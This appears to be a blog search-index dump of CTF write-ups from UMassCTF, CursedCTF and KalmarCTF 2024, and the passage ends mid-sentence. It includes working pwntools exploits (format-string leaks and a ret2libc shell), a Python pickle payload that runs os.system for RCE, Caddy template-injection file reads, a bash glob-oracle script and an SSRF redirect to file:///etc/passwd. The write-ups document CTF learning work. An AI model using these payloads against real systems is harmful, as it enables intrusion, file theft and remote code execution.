00:00:00 +0000", "snippet": "pwn/bench-225Life is one big tug of war. And you don&#39;t win the war by pushing the rope.Files: bench-225nc bench-225.ctf.umasscybersec.org 1337 In this challenge we are given a compiled 64bit binary.running checksec shows the we have full protections: Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabledRunning the binary we see it gives us 5 options, Add 10s, Add 25s Add 45s, Bench and Remove Plate.I’ll start with opening it up with Ghidra, In main I saw an extra option, option 6 for Motivational Quote.The “motivation” function has two vulnerabilities.The first being fgets on line 17 is reading in 1000 bytes into local_18 which is set as only 8. This gives us an overflow.The 2nd is line 20 when the program uses printf without any format specifer, giving us a format strings. This will let us leak important data such as the stack canary, libc and elf addresses. We can use all of those to ret2libc and get a shell.Lets first get into this function.if ((stam &amp;lt; 0x32) &amp;amp;&amp;amp; (DAT_00107092 &amp;lt;= g_Barbell)) { puts(&quot;6. Motivational Quote&quot;); }So for this option to appear we need low stamina, and the “barbell” to be above another value.To achieve this I would just get the lbs above 200, and drain my stamina.As expected, i can use the format strings to leak data here.For this part I like to use a fuzz script to give me a bunch of leaks and i’ll go and check the useful ones myself after.from pwn import *for i in range(1,20): io = process(&#39;./bench-225&#39;,level=&#39;error&#39;) for x in range(5): io.sendline(b&#39;3&#39;) for x in range(6): io.sendline(b&#39;4&#39;) payload = f&quot;%{i}$p&quot; io.sendline(b&#39;6&#39;) io.sendlineafter(b&#39;quote:&#39;,payload) io.recvuntil(b&#39;Quote:&#39;) print(io.recvline(),i) io.close()This will print the leak, and the offset that❯ python3 fuzz.pyb&#39; &quot;0x7fff4364ba80\\n&#39; 1b&#39; &quot;(nil)\\n&#39; 2b&#39; &quot;0x7f8f1f314887\\n&#39; 3b&#39; &quot;0x8\\n&#39; 4b&#39; &quot;(nil)\\n&#39; 5b&#39; &quot;(nil)\\n&#39; 6b&#39; &quot;0xa016da080\\n&#39; 7b&#39; &quot;0xa70243825\\n&#39; 8b&#39; &quot;0xa93ade3f14484a00\\n&#39; 9b&#39; &quot;0x7ffea69d6f50\\n&#39; 10b&#39; &quot;0x55f76fde06a1\\n&#39; 11b&#39; &quot;0x600000000\\n&#39; 12b&#39; &quot;0x15549807e3813f00\\n&#39; 13b&#39; &quot;0x1\\n&#39; 14b&#39; &quot;0x7f111b829d90\\n&#39; 15b&#39; &quot;(nil)\\n&#39; 16b&#39; &quot;0x55a8003b935c\\n&#39; 17b&#39; &quot;0x100000000\\n&#39; 18b&#39; &quot;0x7fff6adc7928\\n&#39; 19The ones that look intresting are, 9 (canary) 13(also could be canary), 15 and 11Using GDB ill leak those addresses and check what they are. Using the Canary command inside GDB I can confirm:13 is the canary 11 is main+83715 is _libc_start_call_main+128Lets script this part together. I start by getting the option 6 to show up.for x in range(5): io.sendline(b&#39;3&#39;)for x in range(6): io.sendline(b&#39;4&#39;)get the 3 leaks:payload = b&quot;%13$p&quot;io.sendline(b&#39;6&#39;)io.sendlineafter(b&#39;quote:&#39;,payload)io.recvuntil(b&#39;Quote:&#39;)canary = int(io.recvline().strip()[1:].decode(),16)log.info(hex(canary))payload = b&quot;%11$p&quot;io.sendline(b&#39;6&#39;)io.sendlineafter(b&#39;quote:&#39;,payload)io.recvuntil(b&#39;Quote:&#39;)main_leak = int(io.recvline().strip()[1:].decode(),16)log.info(hex(main_leak))payload = b&quot;%15$p&quot;io.sendline(b&#39;6&#39;)io.sendlineafter(b&#39;quote:&#39;,payload)io.recvuntil(b&#39;Quote:&#39;)libc_leak = int(io.recvline().strip()[1:].decode(),16)log.info(hex(libc_leak))Calculate the base addresses:main_base = main_leak - elf.symbols.main - 837elf.address = main_baselog.info(hex(main_base))libc_base = libc_leak - 0x29d90log.info(hex(libc_base))libc.address = libc_baseand now I have all I need for a ret2libc:We have a stack canary and the buffer was only 8 bytes, So we start with 8 bytes of “junk” followed by the stack canary, I use 8 \\x00 to padding and the rest is a normal “ret2libc” loading binsh into pop rdi so we can run system(/bin/sh) on the remote server.payload = b&#39;A&#39;*8payload += p64(canary)payload += b&#39;\\x00&#39; *8payload += p64(ret)payload += p64(pop_rdi)payload += p64(next(libc.search(b&quot;/bin/sh&quot;)))payload += p64(libc.symbols.system)io.sendline(b&#39;6&#39;)io.sendline(payload)io.interactive()Unlike most CTFs, the flag was not in the directory the shell spawned me into,So I ran find / 2&amp;gt;/dev/null | grep flag.txtand I see the flag is in /home/tmp_bench_225/flag.txt$ cat /home/tmp_bench_225/flag.txtUMASS{wh0$e_g0nn4_c4rry_t3h_r0pz_&amp;amp;nd_d4_ch41nz?}" }, { "title": "CursedCTF 2024", "url": "/posts/CursedCTF_2024/", "categories": "web, misc", "tags": "ctf, web, misc", "date": "2024-04-05 00:00:00 +0000", "snippet": "Web - Hero’s JourneyChallenge descriptionHero’s Journey consists of a website in which you can create a story by writing in text to different sections as depicted in the following image:So let’s exploit this!Code reviewThis application is written in golang and uses PostgreSQL as the database of choice.We find the following HTTP endpoints:func (s *Server) RegisterRoutes(x *http.ServeMux) { x.HandleFunc(&quot;/&quot;, s.index) x.HandleFunc(&quot;/hero&quot;, s.hero) x.HandleFunc(&quot;/create_hero&quot;, s.createHero) x.HandleFunc(&quot;/update_event&quot;, s.updateEvent) x.HandleFunc(&quot;/flag&quot;, s.flag)}Let’s take a look at what happens when we create a herofunc (s *Server) createHero(rw http.ResponseWriter, req *http.Request) { lock.Lock() defer lock.Unlock() c, err := req.Cookie(cookieName) if err != nil { rw.WriteHeader(http.StatusBadRequest) rw.Write([]byte{0x6e, 0x61, 0x68, 0x20, 0x62, 0x72, 0x75, 0x68}) return } tenant := uuid.MustParse(c.Value) d := db.New(s.db, tenant) if h, _ := d.GetHero(req.Context()); h != nil { rw.WriteHeader(http.StatusBadRequest) rw.Write([]byte(&quot;because of unintended solutions stemming from multiple paralell storylines, we cannot provide you with a second story, it would just be unfair to the challenge author who wants to see you suffer&quot;)) return } events := []*models.Event{} err = json.Unmarshal([]byte(req.URL.Query().Get(&quot;events&quot;)), &amp;amp;events) if err != nil { rw.WriteHeader(http.StatusBadRequest) rw.Write([]byte(&quot;bad json&quot;)) return } last := 0 for _, e := range events { if int(e.Type) != last &amp;amp;&amp;amp; int(e.Type) != last+1 { // jikes rw.Write([]byte(&quot;Get your words straight, Jack!&quot;)) return } last = int(e.Type) } id, err := d.CreateHero(req.Context(), req.URL.Query().Get(&quot;name&quot;), events) if err != nil { rw.Write([]byte(err.Error())) return } http.Redirect(rw, req, &quot;/hero?id=&quot;+strconv.Itoa(id), http.StatusFound)}In the first two lines of this function, we can see a mutex lock is called, this will prevent any race condition as all requests are handled one at a time.We then ensure we have a cookie set and return an error if not.Afterwards, it will create a new connection to the database and make sure our cookie is a valid UUID (As per RFC 4122), later checking if we already have created a hero with this cookie, in which case it will deny our request and return.After this, it will JSON decode the values we have sent over the HTTP GET request and make sure it’s valid. The JSON we send over looks like this:[ { &quot;type&quot;: 0, &quot;description&quot;: &quot;Called into adventure&quot; }, { &quot;type&quot;: 1, &quot;description&quot;: &quot;Refuses&quot; }, { &quot;type&quot;: 2, &quot;description&quot;: &quot;meets&quot; }, { &quot;type&quot;: 3, &quot;description&quot;: &quot;cross&quot; }, { &quot;type&quot;: 4, &quot;description&quot;: &quot;step 4&quot; }, { &quot;type&quot;: 5, &quot;description&quot;: &quot;step 5&quot; }, { &quot;type&quot;: 6, &quot;description&quot;: &quot;step 6&quot; }]The code then checks if the order in which we sent the types is correct, from smallest to largest (0-6). However, a flaw that we can observe with the check of int(e.Type) != last &amp;amp;&amp;amp; int(e.Type) != last+1 is that we can supply the same step multiple times. This will be handy later on.We then create the hero with this story and redirect the user to its page!Looking at the source of the flag page, we can see that a requirement for the story is that the struct:type StorySimulation struct { adventureAccepted bool andTheyWereHappyEverAfter bool mentorAlive bool inKnownWorld bool abyssDone bool emotionalTransformationDone bool}Has the field andTheyWereHappyEverAfter set to true. Let’s take a look at how the story is executed:func simulate(events []*db.Event) (*StorySimulation, error) { ss := NewStorySimulation() for _, e := range events { switch e.Type { case models.CallToAdventure: if !ss.inKnownWorld { return nil, errors.New(&quot;what the hecking d...&quot;) } case models.Refusal: ss.adventureAccepted = false case models.MeetingMentor: ss.mentorAlive = true ss.adventureAccepted = true case models.CrossingThreashold: if !ss.adventureAccepted { return nil, errors.New(&quot;that doesn&#39;t make any sense!&quot;) } ss.inKnownWorld = false case models.Abyss: if ss.inKnownWorld { return nil, errors.New(&quot;wrong place&quot;) } ss.abyssDone = true case models.DeathOfMentor: if ss.inKnownWorld { return nil, errors.New(&quot;keep your facts straight&quot;) } ss.mentorAlive = false ss.emotionalTransformationDone = true case models.Return: if !ss.abyssDone { return nil, errors.New(&quot;need to abyss yourself first!&quot;) } if ss.inKnownWorld { return nil, errors.New(&quot;returning in wierd ways are for the pwn people! stop trying to be quirky&quot;) } if !ss.emotionalTransformationDone { return nil, errors.New(&quot;don&#39;t try to trick me again! get your act together&quot;) } if ss.mentorAlive { ss.andTheyWereHappyEverAfter = true } ss.inKnownWorld = true return ss, nil default: fmt.Println(e.Type) return nil, errors.New(&quot;are you mad!?&quot;) } } return nil, errors.New(&quot;oi bruv&quot;)}By default, the struct is initiated with all values set to false except for inKnownWorld.Let’s see what happens on each step: Step 0: Checks inKnownWorld is true Step 1: Set adventureAccepted to false Step 2: Set mentorAlive and adventureAccepted to true Step 3: Checks adventureAccepted is true, then set inKnownWorld to false Step 4: Checks inKnownWorld is false and sets abyssDone to true Step 5: Checks inKnownWorld is false and sets mentorAlive to false and emotionalTransformationDone to true Step 6: Checks abyssDone and emotionalTransformationDone is set to true and inKnownWorld is set to false. If mentorAlive is true, then it gives us the flag, then it returns the struct state and sets in inKnownWorld to trueThis may sound like a mess but it simply means that we need to execute all steps in order, but execute step 2 before step 6 if we want the flag. But… how can we do this?The check from before makes sure that the story is always in order, so we cannot just send the value in the incorrect position.Let’s take a look at another endpoint, used to update a stage in the story. What this function does is just modify the description of one of the stages, nothing else. However, it will only update the values if the values are in order.The function to query the stages when we want to get the flag executes them in the order they are within the database. This makes an exploit possible.When we update values in Postgres, it will copy the row we are editing and send it to the bottom, leaving its previous space behind.So, we can modify the order of the stages after we have created the story, so it seems like the obvious next step would be to update all the values in the order we want them to be executed. However, this is not possible because the order check is executed before any change, so as soon as we update one value and the table becomes disorganised, we will not be able to edit any more descriptions.We need to abuse another of PostgreSQL’s features, this is called vacuuming.Let’s imagine that the picture above depicts a table with 7 rows. These rows contain the stages 0 through 6.As we explained before, when we update the values of the table, they will be cloned and put at the bottom, leaving behind an empty spaceOne might think that the next value we update will be put into the empty row, as to reuse space. However, this does not happen. Or at least until the table is “vacuumed”.The empty spaces are non-writable. However, when the table is vacuumed, these become writable. When PostgreSQL then searches for the first place it can write into, it will not be the end of the table, it will be the first of the empty writable rows.This would mean that, after updating the last value (Which conserves the order of the stages so we can update another value in the future), it will create an empty row, and if we can somehow trigger a vacuum to the table, the next time we update a value it will be placed before the last stage. This is exactly what we want.So, how exactly do we trigger this vacuum? PostgreSQL by default will automatically run this vacuum after 50 rows are “empty” in the table after 1 minute. So if we update the last value 50 times and then update stage 2, we will get the order of 1, 2, 3, 4, 5, 2, 6. So let’s see the steps to exploit this. Create a hero with stage IDs of 1, 2, 2, 3, 4, 5, 6 Update the description of the last stage 50 times. Wait a minute or two for safe measure. Update the description of stage 2. Go to /flag ProfitAfter we do this, we see the following page:Misc - folderjailChallenge description:look at this amazing esolang i found from hackthebox cyber apolcogzlyaeze. nc chals.4.cursedc.tf 32001Challenge code:#!/usr/local/bin/pythonimport osimport shutilimport tarfilefrom folders.folders import FolderAnalyzer, FolderTranspilerTMP_DIR = &#39;/tmp/program&#39;def unzip_tar_gz(hex_input): tar_gz_data = bytes.fromhex(hex_input) if os.path.exists(TMP_DIR): shutil.rmtree(TMP_DIR) os.makedirs(TMP_DIR, exist_ok=True) with open(TMP_DIR + &#39;/archive.tar.gz&#39;, &#39;wb&#39;) as f: f.write(tar_gz_data) with tarfile.open(TMP_DIR + &#39;/archive.tar.gz&#39;, &#39;r:gz&#39;, dereference=False) as tar: tar.extractall(TMP_DIR) os.remove(TMP_DIR + &#39;/archive.tar.gz&#39;)hex_input = input(&quot;&amp;gt; &quot;)unzip_tar_gz(hex_input)tokens = FolderAnalyzer(TMP_DIR).lex()code = FolderTranspiler(tokens).transpile()exec(code)This challenge uses the esolang Folders in which your program is encoded in the directory structure of folders rather than in actual files.We can submit our directory program to the challenge server in a tar.gz file and it then gets interpeted by the Folders.py python library.Writing a program in the Folders language however isn’t enough for us to be able to read flag.txt from the challenge server as the Folders language only supports some basic functions. Instead we can exploit the python library as it has code injection. When we encode a string for example in Folders this library that converts it to Python doesn’t sanitize double quotes so we can simply include those in our string literal and provide whatever Python code we want after that.We made this program to generate a folder tree that represent a string literal:import oss = b&#39;&quot;);print(open(&quot;/app/flag.txt&quot;).read());print(&quot;&#39;os.mkdir(&quot;gen/&quot;)for i in range(len(s)): c = s[i] h = hex(c)[2:] os.mkdir(f&quot;gen/{i}&quot;) os.mkdir(f&quot;gen/{i}/hex1&quot;) os.mkdir(f&quot;gen/{i}/hex2&quot;) a, b = bin(int(h[0], 16))[2:].rjust(4, &quot;0&quot;), bin(int(h[1], 16))[2:].rjust(4, &quot;0&quot;) for j in range(len(a)): d = a[j] os.mkdir(f&quot;gen/{i}/hex1/{j}&quot;) if d == &quot;1&quot;: os.mkdir(f&quot;gen/{i}/hex1/{j}/1&quot;) for j in range(len(b)): d = b[j] os.mkdir(f&quot;gen/{i}/hex2/{j}&quot;) if d == &quot;1&quot;: os.mkdir(f&quot;gen/{i}/hex2/{j}/1&quot;)Then we took the HelloWorld example from the Python library github and replaced the contents of “New Folder/New folder (2)/New Folder (3)” with the folders we generated.Create the tar file with tar -czf payload.tar.gz .Finally we submit the tar file to the server with this script:from pwn import *def read_file_as_hex(file_path): try: with open(file_path, &quot;rb&quot;) as file: return file.read().hex() except FileNotFoundError: print(f&quot;Error: File &#39;{file_path}&#39; not found.&quot;)file_path = &quot;lol.tar.gz&quot;hex = read_file_as_hex(file_path)conn = remote(&#39;chals.4.cursedc.tf&#39;,32001)conn.recvuntil(b&#39;&amp;gt;&#39;)conn.send(hex)conn.interactive()Initially I tried sending with netcat but that complained about unexpected EOF at 4096 which is some kind of terminal limitation.Running the script:$ python lol.py[+] Opening connection to chals.4.cursedc.tf on port 32001: Done/home/chieftan/ctf/cursedctf24/folderjail/lol.py:20: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes conn.send(hex)[*] Switching to interactive mode $$cursed{i_4ctually_H8_h4ck_th3_BOX}No, seriously, this isn&#39;t a joke. Hack the Box kidnapped my family. They stole my Crocs. I hate them.Because of Hack the Box, my bike brake broke and I almost died. Because of Hack the Box, I was banned from my favorite pub. Because of Hack the Box, Elon Musk banned me from Xitter.Thank you Hack the Box for giving me a $15 Giftcard. I will be sure to use this gift card to purchase a shirt that is not overpriced in any way.Hack The Box is a Great Place to Study Cybersecurity and Learn about offensive Hacking and cyberfsecurity of the securting cyber cybe fcy e rbc yebrf shas theo ahck the box hjajklfndsob tose hosd thuos pdohbvsodufhbnsdop;fbhno[*] Got EOF while reading in interactive" }, { "title": "KalmarCTF 2024 Web Challenges", "url": "/posts/KalmarCTF_2024/", "categories": "Jeopardy", "tags": "ctf, web", "date": "2024-03-17 00:00:00 +0000", "snippet": "WriteupsThese are the web challenges our team solved at KalmarCTF 2024!web/Ez ⛳ v2This was a throwback to last year’s KalmarCTF where there was a similar challenge. I don’t exactly remember the details (I’m sure you can find some writeups online) but it was based on Caddy and that stuck in my mind.Downloading the source, we see there is only really a docker-compose.yml and a Caddyfile which is pretty unusual for a web challenge so I instantly knew it would be an issue with the Caddy configuration. What caught my eye was the following two routes:ua.caddy.chal-kalmarc.tf {tls internaltemplatesimport html_reply `User-Agent: {{.Req.Header.Get &quot;User-Agent&quot;}}`}http.caddy.chal-kalmarc.tf {tls internaltemplatesimport html_reply &quot;You are connected with {http.request.proto} ({tls_version}, {tls_cipher}).&quot;}This is strange! They are using two different approaches to rendering user-supplied variables. The latter looks far more standardized. This made me think there might be some potential for a template injection and so I tried {{7*7}} in my user agent and was greeted with a 500 Internal Server Error. Okay, that is weird! I next tried {{7}} and it was rendered as 7. I’m still not 100% sure at this point if we have a template injection and so I tried the same template they used: {{.Req.Header.Get &quot;User-Agent&quot;}} but it sadly didn’t work and was printed as text. Then it hit me! I’m trying to read the user agent header so it’s obviously going to show me my own payload. I change it to instead read Accept =&amp;gt; {{.Req.Header.Get &quot;Accept&quot;}} and it worked!Okay, so we have a template injection here but what can we actually do? Thankfully I came across a really helpful resource: https://caddyserver.com/docs/modules/http.handlers.templatesThis contains, as far as I can tell, everything we can do with templates in Caddy. I went through the list line by line trying each directive. Using both include and readFile we can achieve local file disclosure on any file on the server:{{readFile &quot;/etc/passwd&quot;}}But this isn’t sufficient because our docker-compose.yml renames the file to a random value:- ./flag:/wpqdDNHnYu8MZeclmpCr9Q:ro # FILE WILL BE RENAMED TO SOMETHING SIMILAR RANDOM ON PRODSo we need a way to list the files. The same link I provided has a listFiles directive near the bottom. Listing the root directory we are able to see: CVGjuzCIVR99QNpJTLtBn9 and reading this file we get our flag:kalmar{Y0_d4wg_I_h3rd_y0u_l1k3_templates_s0_I_put_4n_template_1n_y0ur_template_s0_y0u_c4n_readFile_wh1le_y0u_executeTemplate}I just missed the first blood on this by about 5 minutes which was sad but I’ll be faster next time! :Dweb/File StoreThis one was pretty similar to a memcache RCE on HTB a few days ago affecting flask sessions. So, this was pretty fresh on my mind.Downloading the source, we see it’s pretty bare and most of the logic is contained in the app.py file. It’s also a single route which doesn’t really do much but allows you to upload your own files.The path traversal here is pretty obvious: path = f&#39;static/uploads/{session.sid}&#39; although they have a block on filenames containing .. this block is not applied to session id’s which in Flask are completely user-controlled! What is also interesting here is that the SESSION_TYPE is set to filename which is something I have seen on a few challenges before.Setting a flask session to filename means that session files are saved on the server as files. How do we save them? Well, using Pickle serialization of course! What’s crazy about this is that Pickle is considered dangerous and if you unpickle a user-controlled value it is essentially game over.The Dockerfile also contains: RUN chmod 777 static/uploads flask_session which is a pretty major hint that we are going to need to use this directory traversal to overwrite values in the flask_session directory.In a normal situation you may think to overwrite app.py or perhaps templates/index.html which are both decent approaches depending on the circumstances but these files are not writable here.When creating a Pickle deserialized value, I very much recommend using the docker file provided. This allows you to generate a payload on a server running the same setup and makes it more likely your pickled object contains the correct references to the modules which exist. You will notice issues if you create your payload on different operating systems and possibly different architectures.My idea was to create a payload that would run cp /flag.txt /app/static/uploads/abcd.txt and that way I could see the file in the uploads directory! For these flask sessions there are a few things to note but most importantly you must reserve the first 4 bytes (doesn’t really matter why, just pad it with nullbytes) and when attempting to access a session (to deserialize it) Flask will search for a session called which is a hash of your session cookie. I had read online that it was md5 but from testing locally that was not the case for me and I was not bothered looking through the module source. If you know the algorithm used please let me know!So, I set my cookie to xxx and uploaded a file on my local instance. This revealed that xxx mapped to 254b2716336df2553ce5c04a934d56e4 so we can use this as the name for our serialized Pickle object. We will upload the output of the following script to /app/flask_session/254b2716336df2553ce5c04a934d56e4 here:import pickleimport osclass RCE: def __reduce__(self): cmd = (&#39;cp /flag.txt /app/static/uploads/abcd.txt&#39;) return os.system, (cmd,)def generate_exploit(): payload = pickle.dumps(RCE(), 0) return b&quot;\\x00&quot;*4 + payloadwith open(&quot;254b2716336df2553ce5c04a934d56e4&quot;, &quot;wb&quot;) as f: f.write(generate_exploit())Next, I set my session cookie to ../../flask_session and uploaded the file. This overwrote the session.Then I set my session to xxx and refreshed the page. Lastly, I visited /static/uploads/abcd.txt path and got the flag!kalmar{still_p1ckling_away_in_2024}Web/BadAss Server for HypertextThis was a sourceless web (ew) but was surprisingly fun and insightful! I guess sourceless web isn’t all bad after all. :PI pretty quickly found that the 404 error page was showing the output of a cat command which indicated that we were dealing with a server that was piping all paths into cat and displaying the result! We can easily read local files using this…GET /../../etc/passwd confirmed the worst fears of LFD!!The next step is to make this not a sourceless web challenge. One of my teammates (gg0h) tried out /proc/1/cmdline and found the following:socatTCP4-LISTEN:8080,reuseaddr,forkEXEC:/app/badass_server.shFrom this he was able to read /app/badass_server.sh which contained the following:#!/bin/bash# I hope there are no bugs in this source code...set -edeclare -A request_headersdeclare -A response_headersdeclare methoddeclare urideclare protocoldeclare request_bodydeclare status=&quot;200 OK&quot;abort() { declare -gA response_headers status=&quot;400 Bad Request&quot; write_headers if [ ! -z ${1+x} ]; then &amp;gt;&amp;amp;2 echo &quot;Request aborted: $1&quot; echo -en $1 fi exit 1}write_headers() { response_headers[&#39;Connection&#39;]=&#39;close&#39; response_headers[&#39;X-Powered-By&#39;]=&#39;Bash&#39; echo -en &quot;HTTP/1.0 $status\\r\\n&quot; for key in &quot;${!response_headers[@]}&quot;; do echo -en &quot;${key}: ${response_headers[$key]}\\r\\n&quot; done echo -en &#39;\\r\\n&#39; &amp;gt;&amp;amp;2 echo &quot;$(date -u +&#39;%Y-%m-%dT%H:%M:%SZ&#39;) $SOCAT_PEERADDR $method $uri $protocol -&amp;gt; $status&quot;}receive_request() { read -d $&#39;\\n&#39; -a request_line if [ ${#request_line[@]} != 3 ]; then abort &quot;Invalid request line&quot; fi method=${request_line[0]} uri=${request_line[1]} protocol=$(echo -n &quot;${request_line[2]}&quot; | sed &#39;s/^\\s*//g&#39; | sed &#39;s/\\s*$//g&#39;) if [[ ! $method =~ ^(GET|HEAD)$ ]]; then abort &quot;Invalid request method&quot; fi if [[ ! $uri =~ ^/ ]]; then abort &#39;Invalid URI&#39; fi if [ $protocol != &#39;HTTP/1.0&#39; ] &amp;amp;&amp;amp; [ $protocol != &#39;HTTP/1.1&#39; ]; then abort &#39;Invalid protocol&#39; fi while read -d $&#39;\\n&#39; header; do stripped_header=$(echo -n &quot;$header&quot; | sed &#39;s/^\\s*//g&#39; | sed &#39;s/\\s*$//g&#39;) if [ -z &quot;$stripped_header&quot; ]; then break; fi header_name=$(echo -n &quot;$header&quot; | cut -d &#39;:&#39; -f 1 | sed &#39;s/^\\s*//g&#39; | sed &#39;s/\\s*$//g&#39; | tr &#39;[:upper:]&#39; &#39;[:lower:]&#39;); header_value=$(echo -n &quot;$header&quot; | cut -d &#39;:&#39; -f 2- | sed &#39;s/^\\s*//g&#39; | sed &#39;s/\\s*$//g&#39;); if [ -z &quot;$header_name&quot; ] || [[ &quot;$header_name&quot; =~ [[:space:]] ]]; then abort &quot;Invalid header name&quot;; fi # If header already exists, add value to comma separated list if [[ -v request_headers[$header_name] ]]; then request_headers[$header_name]=&quot;${request_headers[$header_name]}, $header_value&quot; else request_headers[$header_name]=&quot;$header_value&quot; fi done body_length=${request_headers[&quot;content-length&quot;]:-0} if [[ ! $body_length =~ ^[0-9]+$ ]]; then abort &quot;Invalid Content-Length&quot; fi read -N $body_length request_body}handle_request() { # Default: serve from static directory path=&quot;/app/static$uri&quot; path_last_character=$(echo -n &quot;$path&quot; | tail -c 1) if [ &quot;$path_last_character&quot; == &#39;/&#39; ]; then path=&quot;${path}index.html&quot; fi if ! cat &quot;$path&quot; &amp;gt; /dev/null; then status=&quot;404 Not Found&quot; else mime_type=$(file --mime-type -b &quot;$path&quot;) file_size=$(stat --printf=&quot;%s&quot; &quot;$path&quot;) response_headers[&quot;Content-Type&quot;]=&quot;$mime_type&quot; response_headers[&quot;Content-Length&quot;]=&quot;$file_size&quot; fi write_headers cat &quot;$path&quot; 2&amp;gt;&amp;amp;1}receive_requesthandle_requestNow came the sourced part. We tried a lot of different approaches and I thought I had RCE through overflowing the read directive but that only worked in my terminal. :(Eventually another one of our players (Protag) came on and mentioned the possibilities of globbing and word splitting. I have to admit, I was not too familiar with this concept except for a few bash jails I have done before.I noticed the following logic:if [ $protocol != &#39;HTTP/1.0&#39; ] &amp;amp;&amp;amp; [ $protocol != &#39;HTTP/1.1&#39; ]; then abort &#39;Invalid protocol&#39; fiThis has some unquoted variables and may allow us to glob the $protocol value. I tried a basic test:GET /whatever /app/static/assets/f*Globbing this should only produce a single result and we got Invalid Protocol so I next tried:GET /whatever /app/static/assets/*Which should produce &amp;gt; 1 results. The output from the server this time was a cat error. Testing a glob which should produce 0 results gave Invalid Protocol too. This meant we had an oracle whereby we could detect whether there is &amp;gt; 1 files in a directory.We want to leak the hidden directory containing the flag (presumably). I decided using a regex approach would be best. We have to create a regex which exactly matches ONE of the known folders and then we can brute force values to find the hidden one (so that glob will return 2 files and give us that cat error)!I’ll save you the manual nightmare which followed but you can see the workings below:/assets/f200d055a267ae56160198e0fcb47e5f/try_harder.tx /app/static/assets/[^fabcde1345678][^123457890abc][^abe][^abcdef124][^abcde1][^abcdef0134][^abdef012347][^012345678abcde][^103456789abcd][^abcdef013][^abcde01234567][^a-f0123456][^a-f0234][^b-f012345678][^ab][^678][^a][^a-f0][^134567890abcdef][^b-f01][^abdef1234567890][^a][^abcdef12340678][^b-f1][^01234568][^a-f01234][^abdef0123][^1234567890abcef][^a][^ac][^a-f02345][^a-f02345]*And for those of you who are perfectionists, gg0h wrote an automated solution which was pretty cool:from pwn import *known1 = &#39;f200d055a267ae56160198e0fcb47e5f&#39;known2 = &#39;26c3f25922f71af3372ac65a75cd3b11&#39;total_payload = &#39;&#39;directory = &#39;&#39;def attempt(payload): conn = remote(&#39;chal-kalmarc.tf&#39;,8080) req = f&quot;&quot;&quot;HEAD /assets/f200d055a267ae56160198e0fcb47e5f/try_harder.tx /app/static/assets/{total_payload}{payload}*Host: chal-kalmarc.tf:8080 &quot;&quot;&quot;.lstrip() + &quot;\\r\\n&quot; * 2 conn.send(req) resp = conn.recvall() return respfor i in range(len(known1)): flag = False charset = string.hexdigits[:-6] charset = charset.replace(known2[i], &#39;&#39;) # case where known1[i] == target[i] payload = f&quot;[{known1[i]}]&quot; resp = attempt(payload) if b&#39;No such file or directory&#39; in resp: total_payload += payload directory += known1[i] print(directory) continue for c in charset: payload = f&#39;[{c}{known1[i]}]&#39; resp = attempt(payload) if b&#39;No such file or directory&#39; in resp: total_payload += payload directory += c print(directory) flag = True break # no match by this point means known2[i] == target[i] if not flag: total_payload += f&quot;[{known1[i]}{known2[i]}]&quot; directory += known2[i] print(directory) print(total_payload)print(directory)flag_payload = f&quot;&quot;&quot;GET /assets/{directory}/flag.txt HTTP/1.1Host: chal-kalmarc.tf:8080&quot;&quot;&quot;.lstrip() + &quot;\\r\\n&quot; * 2conn = remote(&#39;chal-kalmarc.tf&#39;,8080)conn.send(flag_payload) print(conn.recvall())Either way, you will find the hidden directory is 9df5256fe48859c91122cb92964dbd66 and you can find the flag located at /assets/9df5256fe48859c91122cb92964dbd66/flag.txt to solve it!kalmar{17b29adf_bash_web_server_was_a_mistake_374add33}web/Is It DownThis was yet another sourceless web challenge.We noticed the obvious SSRF straight away. If you intercept the HTTP request you can find the response is given. We tried to use a redirect to a http server and found that it worked. This meant that we could send it to our https website and then redirect to a non-http address from there. Next, gg0h was able to use the file:// URI to leak local files and read the /etc/passwd file.I wrote my own PHP script to allow me to automatically play with this bug:&amp;lt;?phpheader(&quot;Location: &quot;.$_GET[&#39;x&#39;]);?&amp;gt;This way I could host it on my HTTPS domain and send the bot to:https://ireland.re/exploit.php?x=file:///etc/passwdAgain, the same process of dumping files followed. Similarly, gg0h came in good with the /proc/1/cmdline file which contained a reference to this /etc/uwsgi/uwsgi-custom.ini file.[uwsgi]uid = www-datagid = www-datamaster = trueprocesses = 20http-socket = 0.0.0.0:5000chmod-sock = 664vacuum = truedie-on-term = truewsgi-file = /var/www/keep-dreaming-sonny-boy/app.pycallable = apppythonpath = /usr/local/lib/python3.11/site-packagesThis file contained a reference to /var/www/keep-dreaming-sonny-boy/app.py as can be seen above!from flask import Flask, request, send_from_directory, session, abortfrom requestlib import fetchfrom config import session_encryption_keyimport subprocessimport osdef protect_secrets(): os.unlink(&quot;config.py&quot;)def check_url(url): if not isinstance(url, str) or len(url) == 0: return False, &quot;Please provide a regular URL!&quot; if not url.startswith(&quot;https://&quot;) or url.lstrip() != url: return False, &quot;URL must start with &#39;https://&#39;. We do not want anything insecure here!&quot; return True, &quot;&quot;app = Flask(__name__, static_folder=&#39;static&#39;, static_url_path=&#39;/assets/&#39;)app.secret_key = session_encryption_keyprint(&quot;Using key:&quot;, app.secret_key)protect_secrets()@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])def home(): return send_from_directory(&#39;pages&#39;, &#39;index.html&#39;)@app.route(&#39;/flag&#39;, methods=[&#39;GET&#39;])def healthcheck(): if session.get(&quot;admin&quot;) == True: return subprocess.check_output(&quot;/readflag&quot;) else: return abort(403)@app.route(&#39;/check&#39;, methods=[&#39;POST&#39;])def check(): url = request.form.get(&quot;url&quot;) valid, err = check_url(url) if not valid: return { &#39;success&#39;: False, &#39;error&#39;: err } if True: content = fetch(url) return { &#39;success&#39;: True, &#39;online&#39;: content is not None, &#39;content&#39;: content }if __name__ == &quot;__main__&quot;: app.run(host=&#39;0.0.0.0&#39;, port=10600, debug=False)No more sourceless! We know we need to visit /flag with admin set to True which means we would need to leak the session_encryption_key value.Sadly, the config.py file is deleted at runtime. We got stuck here for some time and went down some uWSGI rabbit holes. We also looked into the possibility to leaked the stdout where the value is printed to the screen.Some time later it hit me and I recalled that __pycache__ exists! I spun up an environment with the same Python version (3.11) and generated some pycache. This allowed me to predict the path: /var/www/keep-dreaming-sonny-boy/__pycache__/config.cpython-311.pyc and it was dumped!What followed was a little bit of “reverse engineering” to pick apart from the output which part was the 